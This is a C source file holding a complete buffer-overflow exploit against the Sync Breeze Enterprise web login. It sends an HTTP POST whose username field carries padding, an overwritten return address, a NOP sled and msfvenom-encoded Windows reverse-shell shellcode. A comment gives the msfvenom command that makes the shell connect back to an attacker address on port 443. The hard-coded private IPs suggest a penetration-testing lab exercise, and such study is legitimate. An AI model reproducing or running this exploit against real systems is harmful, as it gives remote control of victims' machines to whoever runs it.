/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.175.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.175.10\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://192.168.175.10/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    //unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll
    unsigned char retn[] = "\x83\x0c\x09\x10"; //0x10090c83
    
    // msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.175 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
    //
    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xb8\xaa\xd5\xbe\x89\xda\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
    "\x52\x31\x42\x12\x03\x42\x12\x83\x68\xd1\x5c\x7c\x90\x32\x22"
    "\x7f\x68\xc3\x43\x09\x8d\xf2\x43\x6d\xc6\xa5\x73\xe5\x8a\x49"
    "\xff\xab\x3e\xd9\x8d\x63\x31\x6a\x3b\x52\x7c\x6b\x10\xa6\x1f"
    "\xef\x6b\xfb\xff\xce\xa3\x0e\xfe\x17\xd9\xe3\x52\xcf\x95\x56"
    "\x42\x64\xe3\x6a\xe9\x36\xe5\xea\x0e\x8e\x04\xda\x81\x84\x5e"
    "\xfc\x20\x48\xeb\xb5\x3a\x8d\xd6\x0c\xb1\x65\xac\x8e\x13\xb4"
    "\x4d\x3c\x5a\x78\xbc\x3c\x9b\xbf\x5f\x4b\xd5\xc3\xe2\x4c\x22"
    "\xb9\x38\xd8\xb0\x19\xca\x7a\x1c\x9b\x1f\x1c\xd7\x97\xd4\x6a"
    "\xbf\xbb\xeb\xbf\xb4\xc0\x60\x3e\x1a\x41\x32\x65\xbe\x09\xe0"
    "\x04\xe7\xf7\x47\x38\xf7\x57\x37\x9c\x7c\x75\x2c\xad\xdf\x12"
    "\x81\x9c\xdf\xe2\x8d\x97\xac\xd0\x12\x0c\x3a\x59\xda\x8a\xbd"
    "\x9e\xf1\x6b\x51\x61\xfa\x8b\x78\xa6\xae\xdb\x12\x0f\xcf\xb7"
    "\xe2\xb0\x1a\x17\xb2\x1e\xf5\xd8\x62\xdf\xa5\xb0\x68\xd0\x9a"
    "\xa1\x93\x3a\xb3\x48\x6e\xad\x7c\x24\x07\x82\x15\x37\xe7\xdd"
    "\x5e\xbe\x01\xb7\xb0\x97\x9a\x20\x28\xb2\x50\xd0\xb5\x68\x1d"
    "\xd2\x3e\x9f\xe2\x9d\xb6\xea\xf0\x4a\x37\xa1\xaa\xdd\x48\x1f"
    "\xc2\x82\xdb\xc4\x12\xcc\xc7\x52\x45\x99\x36\xab\x03\x37\x60"
    "\x05\x31\xca\xf4\x6e\xf1\x11\xc5\x71\xf8\xd4\x71\x56\xea\x20"
    "\x79\xd2\x5e\xfd\x2c\x8c\x08\xbb\x86\x7e\xe2\x15\x74\x29\x62"
    "\xe3\xb6\xea\xf4\xec\x92\x9c\x18\x5c\x4b\xd9\x27\x51\x1b\xed"
    "\x50\x8f\xbb\x12\x8b\x0b\xdb\xf0\x19\x66\x74\xad\xc8\xcb\x19"
    "\x4e\x27\x0f\x24\xcd\xcd\xf0\xd3\xcd\xa4\xf5\x98\x49\x55\x84"
    "\xb1\x3f\x59\x3b\xb1\x15";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
